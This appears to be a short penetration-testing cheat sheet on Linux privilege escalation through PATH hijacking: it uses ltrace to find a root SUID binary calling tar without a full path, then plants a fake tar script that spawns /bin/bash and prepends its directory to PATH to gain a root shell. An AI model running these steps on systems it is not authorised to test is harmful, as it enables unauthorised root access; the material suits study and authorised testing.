# A service or a program that is run or is owned by root
When a service or a program is accessing resources as root or running and **SUID** program that has root privileges.


# PATH hijacking
If one cannot see a full path either in a service or a program, they can overwrite or append
to the `$PATH` environment variable.

**The example below is for binaries, but can also be used for services or cronjobs**
1. Find the program that is being referenced
    ```bash
    ltrace ./binary
    <SNIP>
    system("tar -cvf /root/file")
    <SNIP>
    ```
    `system` calls tar without full path, therefore we can add our own `tar` file to `$PATH`.

2. Make our own `tar` script, add payload and append to `$PATH`
    ```bash
    cd /dev/shm
    export PATH=/dev/shm:$PATH
    echo -e "#!/bin/bash\n/bin/bash" > tar
    chmod +x tar
    ```
3. Run the program again
    ```
    ./binary
    ```